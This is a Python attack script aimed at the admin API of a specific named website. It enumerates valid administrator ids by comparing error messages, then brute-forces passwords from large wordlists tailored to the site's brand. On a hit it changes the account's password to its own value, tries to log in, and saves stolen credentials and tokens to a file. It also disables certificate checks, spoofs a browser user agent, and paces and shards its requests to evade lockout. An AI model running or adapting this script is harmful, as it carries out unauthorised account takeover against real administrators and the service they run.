#!/usr/bin/env python3
"""Two-namespace admin oracle (v2).

Namespaces:
  PWD_URL   /admin-api/auth/password  — change-old-password semantics.
            ghost id -> "등록되지 않은 사번 입니다."
            real id  -> "비밀번호가 일치하지 않습니다."  (appears lockout-free)
  LOGIN_URL /admin-api/auth/login     — different ID pool entirely; all 86
            username-style candidates were ghosts there (run-2 audit).
            Hypothesis: login uses numeric 사번 or email-style ids.

Phases (each sharded via ADMIN_SHARDS/ADMIN_SHARD, deterministic partitions):
  A: existence sweep of CANDIDATES on PWD_URL        -> real_ids.json
  B: old-password grind for real ids (PARTITIONED)   -> old pwd -> flip -> login
  D: login-namespace enum: numeric 1..400 + emails   -> login_real_ids.json
  E: login-grind for real login ids (budget 12/id)   -> admin_token.json
  C: legacy bridge real ids onto LOGIN top-12

State: oracle_state_{i}.json per shard. Crack progress migrates as
max(pwd_idx) across all shard files so repartitions never repeat work.
"""
import glob
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PWD_URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/password"
LOGIN_URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/login"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
DELAY = float(os.environ.get("ORACLE_DELAY", "0.5"))
PHASE_A_CAP = int(os.environ.get("ORACLE_ENUM_CAP", "120"))
PHASE_B_CAP = int(os.environ.get("ORACLE_CRACK_CAP", "1200"))
PHASE_D_CAP = int(os.environ.get("ORACLE_LOGIN_ENUM_CAP", "450"))
PHASE_E_CAP = int(os.environ.get("ORACLE_LOGIN_GRIND_CAP", "60"))
NUM_RANGE = int(os.environ.get("ORACLE_NUM_MAX", "400"))
EMAIL_DOMAINS = ["okbigyo.com"]

CANDIDATES = [
    # spec-leaked + confirmed-real
    "dongmin", "kimdongmin", "kdongmin", "admin", "administrator",
    # roles / org
    "manager", "master", "root", "superadmin", "god", "operator", "oper",
    "staff", "test", "demo", "guest", "cs", "support", "care", "center",
    "biz", "sales", "finance", "loan", "ceo", "cfo", "coo", "cto", "cmo",
    "dev", "developer", "engineer", "programmer", "coder", "ops", "pm",
    "product", "design", "designer", "marketing", "ad", "pr", "hr",
    "accountant", "bookkeeper", "tax", "legal", "contract", "audit",
    # brand
    "okbigyo", "bigyo", "okbank", "ok", "coocon", "okcs", "okadmin",
    "bigyoadmin", "cooconadmin", "okbigyo1", "bigyo1", "okbigyo123",
    "okmobile", "okteam", "okdev", "okpm", "okcare", "oksales", "okbiz",
    "okoffice", "okhr", "okfinance", "okloan", "okcredit", "bigyoteam",
    "bigyodev", "bigyocs",
    # korean dev names (romanized)
    "seoyeon", "hyemin", "minji", "sujin", "jiwoo", "taeyang", "haneul",
    "sungmin", "jihyun", "minseo", "yejin", "eunjoo", "jiyoon", "haerin",
    "dasom", "siwon", "junho", "yujin", "gihun", "woohyuk", "jaehyuk",
    "seungjun", "hyunsik", "kyungmin", "namchu", "byeongsu", "changho",
    "seungho", "minho", "junyoung", "sungho", "taejun", "hyuk", "jung",
    "ho", "su", "man", "young", "mi", "hee", "ju", "ji", "na", "so",
    "ha", "bo", "bin", "jin", "seong", "hwa", "gil", "rok", "bang",
    # english common
    "kevin", "david", "chris", "mike", "james", "peter", "alex", "ben",
    "tom", "lucy", "emma", "mia", "grace", "angel", "star", "moon",
    "coffee", "happy", "love", "hello", "welcome", "money", "bank",
    # numeric 사번 probes
    "1", "2", "3", "10", "100", "1000", "1001", "1002", "2001", "3001",
    "9999", "admin1", "admin2", "admin01", "super", "secret", "boss",
    "owner", "founder", "partner", "president", "director", "chief",
    "leader", "user", "member", "maintainer", "tester", "qa",
]

# NOTE: first 94 entries are FIXED ORDER — per-id pwd_idx state indexes into
# this list. Append-only extensions below (de-duplicated against the base).
_BASE_PASSWORDS = [
    "admin1234", "admin123!", "admin1234!", "Admin1234!", "admin!1234",
    "okbigyo1234", "Okbigyo1234!", "okbigyo!", "okbigyo123",
    "bigyo1234", "Bigyo1234!", "bigyo!", "bigyo123",
    "coocon1234", "Coocon1234!", "coocon!", "coocon123",
    "ok1234!", "ok1234", "okbank1234", "okbank!",
    "1qaw2ews", "1q2w3e4r", "qwerty1234", "qwer1234", "zaq1xsw2",
    "password", "password1", "pass1234", "abc12345", "abcd1234",
    "iloveyou1!", "hello1234", "welcome1!", "test1234", "spring1234",
    "oracle1234", "weblogic1234", "11111111", "00000000", "12345678",
    "123456789", "1234567890", "123456789!", "1234567890!",
    "a12345678", "a123456789", "q12345678", "pw123456", "temp1234",
    "20240101", "20250101", "20260101", "okbigyo2026", "bigyo2026",
    "Okbigyo!1234", "okbigyo!1234", "BIGYO1234!", "Ok_bigyo1234",
    "okbigyo!@#", "okbigyo1234!", "Bigyo!1234", "coocon!1234", "Coocon!1234",
    "okbigyo2024", "okbigyo2025", "bigyo2024!", "bigyo2025!", "bigyo2026!",
    "okbank1234!", "Okbank1234!", "okbank!1234",
    "1qaz2wsx", "1qazxsw2", "zsx1csw2", "2wsx1qaz", "1qa2ws3ed",
    "loan1234!", "Loan1234!", "credit1234!", "Credit1234!", "money1234!",
    "finance1234!", "admin@1234", "admin!@#", "p@ssw0rd", "Password123!",
    "Welcome123!", "Springboot1!", "Oracle1234!", "java1234!",
    "1234!qaws", "!qaws1234", "qaws1234!", "asdf1234!",
]

_TIER3 = [
    # keyboard / classic
    "qwer1234!", "qwerty!", "1q2w3e4r5t", "zaq12wsx", "zxcv1234",
    "poiuyt1234", "abcdef1234", "abcd1234!", "Abc1234!", "Abc!1234",
    "aaaa1234", "1111122222", "12341234!", "12121212", "22222222",
    "33333333", "1231231234", "1234512345", "5432154321", "11223344",
    "1122334455", "654321", "654321!", "852456", "258369", "147258369",
    "159357", "741852963", "01012345678",
    # brand / company
    "okbigyo123456789", "okbigyo@1234", "okbigyo!@#$", "okbigyo2026!",
    "okbigyo2025!", "okbigyo2024!", "okbigyo1!", "okbigyo!2026",
    "bigyo123456789", "bigyo!@#", "bigyo@1234", "bigyo2024", "bigyo2025",
    "coocon123456789", "coocon!@#", "okbank123456789", "okbank2024!",
    "okloan1234!", "okcredit1234!", "okmoney1234!", "oksave1234!",
    "okinvent1234!", "okfund1234!", "okasset1234!", "okcapital1234!",
    # years / dates
    "2024!!", "2025!!", "2026!!", "1234!!", "20240101!", "20250101!",
    "20260101!", "20241231", "20251231", "20261231", "01012024",
    "01012025", "01012026", "newyear2026!", "happy2026!", "chuseok2025!",
    # personal / korean
    "sarang1234!", "saranghae1234!", "iloveyou1234!", "love1234!",
    "family1234!", "baby1234!", "dream1234!", "hope1234!", "life1234!",
    "health1234!", "bank1234!", "apple1234!", "banana1234!", "orange1234!",
    "melon1234!", "peach1234!", "soccer1234!", "basketball1234!",
    "baseball1234!", "coffee1234!", "tea1234!", "beer1234!", "wine1234!",
    "cake1234!", "chocolate1234!", "pizza1234!", "burger1234!", "ramen1234!",
    "bibimbap1234!", "samgyeopsal1234!", "summer1234!", "winter1234!",
    "autumn1234!", "rainbow1234!", "star1234!", "moon1234!", "sunshine1234!",
    # tech / role
    "changeme1234!", "init1234!", "welcome1234!", "secret1234!",
    "pass1234!", "passwd1234!", "password1234!", "p@ssw0rd1234", "P@ss1234",
    "root1234!", "toor1234", "admin@123", "admin!123", "admin123",
    "Administrator123!", "SuperAdmin123!", "superadmin1234!",
    "Manager1234!", "Operator1234!", "Developer1234!", "developer1234!",
    "engineer1234!", "Tester1234!", "Demo1234!", "Guest1234!", "Staff1234!",
    "Partner1234!", "Finance1234!", "Cs1234!", "Support1234!", "Care1234!",
]


def _build_passwords():
    seen = set()
    out = []
    for p in _BASE_PASSWORDS + _TIER3:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


PASSWORDS = _build_passwords()


def post(url, payload):
    body = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=body,
                                 headers={"User-Agent": UA, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=12, context=CTX) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, repr(e)[:120]


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def jload(name):
    p = os.path.join(HERE, name)
    if os.path.exists(p):
        try:
            return json.load(open(p))
        except Exception:
            pass
    return {}


def jsave(name, obj):
    json.dump(obj, open(os.path.join(HERE, name), "w"), ensure_ascii=False, indent=1)


def best_pwd_idx(shard_total, shard_idx, rid, key="crack"):
    """Adopt max pwd_idx across all shard state files (migration safety)."""
    best = 0
    pat = os.path.join(HERE, "oracle_state_*.json") if shard_total > 1 else os.path.join(HERE, "oracle_state.json")
    for fp in glob.glob(pat):
        try:
            d = json.load(open(fp))
        except Exception:
            continue
        rec = d.get(key, {}).get(rid)
        if isinstance(rec, dict):
            best = max(best, int(rec.get("pwd_idx", 0)))
    return best


def save_admin_token(rid, pwd, lbody):
    cred = {"adminId": rid, "password": pwd, "raw": lbody[:2000], "ts": int(time.time())}
    tok = jload("admin_token.json")
    if not isinstance(tok, list):
        tok = [tok] if tok else []
    tok.append(cred)
    jsave("admin_token.json", tok)
    log("*** admin_token.json WRITTEN")


def main():
    STOT = int(os.environ.get("ADMIN_SHARDS", "1"))
    SIDX = int(os.environ.get("ADMIN_SHARD", "0"))
    SF = f"oracle_state_{SIDX}.json" if STOT > 1 else "oracle_state.json"
    st = jload(SF)
    real = jload("real_ids.json")
    lreal = jload("login_real_ids.json")
    my_cands = [c for i, c in enumerate(CANDIDATES) if i % STOT == SIDX]
    log(f"ORACLE SHARD {SIDX}/{STOT}: {len(my_cands)} cands, {len(real)} real, {len(lreal)} login-real, {len(PASSWORDS)} pwds")

    # ---- Phase A: existence sweep on password endpoint
    spent_a = 0
    for cid in my_cands:
        if cid in st.get("enum_done", {}):
            continue
        if spent_a >= PHASE_A_CAP:
            log(f"PHASE_A_CAP {PHASE_A_CAP} reached")
            break
        _, body = post(PWD_URL, {"adminId": cid, "name": "테스트", "birthday": "19900101",
                                 "password": "Dummy!1234", "newPassword": "Dummy!5678"})
        spent_a += 1
        is_real = "일치하지" in body
        st.setdefault("enum_done", {})[cid] = "real" if is_real else "ghost"
        if is_real:
            real[cid] = {"ts": int(time.time()), "via": "oracle"}
            log(f"★★ REAL ID CONFIRMED: {cid} :: {body[:120]}")
        else:
            log(f"ghost: {cid}")
        jsave(SF, st)
        jsave("real_ids.json", real)
        time.sleep(DELAY)

    # ---- Phase B: old-password grind, PARTITIONED over sorted real ids
    my_rids = [r for i, r in enumerate(sorted(real.keys())) if i % STOT == SIDX]
    spent_b = 0
    for rid in my_rids:
        rec = st.setdefault("crack", {})
        if rid not in rec:
            rec[rid] = {"pwd_idx": best_pwd_idx(STOT, SIDX, rid, "crack")}
        idx = rec[rid]["pwd_idx"]
        while idx < len(PASSWORDS) and spent_b < PHASE_B_CAP:
            pwd = PASSWORDS[idx]
            idx += 1
            spent_b += 1
            rec[rid]["pwd_idx"] = idx
            _, body = post(PWD_URL, {"adminId": rid, "name": "테스트", "birthday": "19900101",
                                     "password": pwd, "newPassword": "Flip!2026x"})
            jsave(SF, st)
            if '"result":"SUCCESS"' in body or '"result": "SUCCESS"' in body or '"success":true' in body:
                log(f"★★★ OLD PASSWORD FOUND: {rid} = {pwd} :: {body[:200]}")
                for lp in (pwd, "Flip!2026x"):
                    lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": lp})
                    log(f"LOGIN {rid}/{lp}: http={lst} {lbody[:200]}")
                    if '"token"' in lbody:
                        save_admin_token(rid, lp, lbody)
                        break
                break
            log(f"B {rid} #{idx} {pwd}: {body[:100]}")
            time.sleep(DELAY)
        if spent_b >= PHASE_B_CAP:
            log(f"PHASE_B_CAP {PHASE_B_CAP} reached")
            break

    # ---- Phase B2: per-id derived candidates (template-account initials)
    def derived(rid):
        cap = rid.capitalize()
        return [rid, cap, rid.upper(),
                rid + "1234", cap + "1234", rid + "!1234", cap + "!1234",
                rid + "2024", rid + "2025", rid + "2026",
                rid + "@1234", rid + "_1234", rid + "123", rid + "!"]

    spent_b2 = 0
    for rid in my_rids:
        rec = st.setdefault("derive", {})
        if rid not in rec:
            rec[rid] = {"idx": 0}
        idx = rec[rid]["idx"]
        while idx < 14 and spent_b2 < int(os.environ.get("ORACLE_DERIVE_CAP", "500")):
            cand = derived(rid)[idx]
            idx += 1
            spent_b2 += 1
            rec[rid]["idx"] = idx
            _, body = post(PWD_URL, {"adminId": rid, "name": "테스트", "birthday": "19900101",
                                     "password": cand, "newPassword": "Flip!2026x"})
            jsave(SF, st)
            if '"result":"SUCCESS"' in body or '"result": "SUCCESS"' in body or '"success":true' in body:
                log(f"★★★ DERIVED OLD PASSWORD FOUND: {rid} = {cand} :: {body[:200]}")
                for lp in (cand, "Flip!2026x"):
                    lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": lp})
                    log(f"LOGIN {rid}/{lp}: http={lst} {lbody[:200]}")
                    if '"token"' in lbody:
                        save_admin_token(rid, lp, lbody)
                        break
                break
            log(f"B2 {rid} #{idx} {cand}: {body[:100]}")
            time.sleep(DELAY)
        if spent_b2 >= int(os.environ.get("ORACLE_DERIVE_CAP", "500")):
            break

    # ---- Phase D: login-namespace enum (numeric 사번 + email forms)
    nums = [str(n) for n in range(1, NUM_RANGE + 1)]
    my_nums = [n for i, n in enumerate(nums) if i % STOT == SIDX]
    emails = [(rid, f"{rid}@{dom}") for rid in sorted(real.keys()) for dom in EMAIL_DOMAINS]
    my_emails = [e for i, e in enumerate(emails) if i % STOT == SIDX]
    spent_d = 0
    for lid in my_nums + [e[1] for e in my_emails]:
        if lid in st.get("login_enum", {}):
            continue
        if spent_d >= PHASE_D_CAP:
            log(f"PHASE_D_CAP {PHASE_D_CAP} reached")
            break
        _, body = post(LOGIN_URL, {"adminId": lid, "password": "Probe!1234"})
        spent_d += 1
        is_real = "일치하지" in body
        st.setdefault("login_enum", {})[lid] = "real" if is_real else "ghost"
        if is_real:
            lreal[lid] = {"ts": int(time.time()), "kind": "numeric" if lid.isdigit() else "email"}
            log(f"★★ LOGIN-NAMESPACE REAL ID: {lid} :: {body[:120]}")
            jsave("login_real_ids.json", lreal)
        jsave(SF, st)
        time.sleep(float(os.environ.get("ORACLE_LOGIN_DELAY", "0.4")))

    # ---- Phase E: grind discovered login-ns ids (budget 12/id, lockout-caution)
    my_lrids = [r for i, r in enumerate(sorted(lreal.keys())) if i % STOT == SIDX]
    spent_e = 0
    for rid in my_lrids:
        rec = st.setdefault("lg_crack", {})
        if rid not in rec:
            rec[rid] = {"pwd_idx": best_pwd_idx(STOT, SIDX, rid, "lg_crack")}
        idx = rec[rid]["pwd_idx"]
        while idx < 12 and spent_e < PHASE_E_CAP:
            pwd = PASSWORDS[idx]
            idx += 1
            spent_e += 1
            rec[rid]["pwd_idx"] = idx
            lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": pwd})
            jsave(SF, st)
            if '"token"' in lbody:
                log(f"★★★ LOGIN GRIND CRACKED: {rid} = {pwd}")
                save_admin_token(rid, pwd, lbody)
                break
            log(f"E {rid} #{idx} {pwd}: http={lst} {lbody[:100]}")
            time.sleep(DELAY)
        if spent_e >= PHASE_E_CAP:
            log(f"PHASE_E_CAP {PHASE_E_CAP} reached")
            break

    # ---- Phase C: legacy bridge real ids onto LOGIN (top-12, partitioned)
    spent_c = 0
    for rid in my_rids:
        rec = st.setdefault("bridge", {})
        if rid not in rec:
            rec[rid] = {"pwd_idx": best_pwd_idx(STOT, SIDX, rid, "bridge")}
        idx = rec[rid]["pwd_idx"]
        while idx < 12 and spent_c < 40:
            pwd = PASSWORDS[idx]
            idx += 1
            spent_c += 1
            rec[rid]["pwd_idx"] = idx
            lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": pwd})
            jsave(SF, st)
            if '"token"' in lbody:
                log(f"★★★ BRIDGE LOGIN CRACKED: {rid} = {pwd}")
                save_admin_token(rid, pwd, lbody)
                break
            log(f"C {rid} #{idx} {pwd}: http={lst} {lbody[:100]}")
            time.sleep(DELAY)
        if spent_c >= 40:
            break
    log("ORACLE CYCLE DONE")


if __name__ == "__main__":
    main()
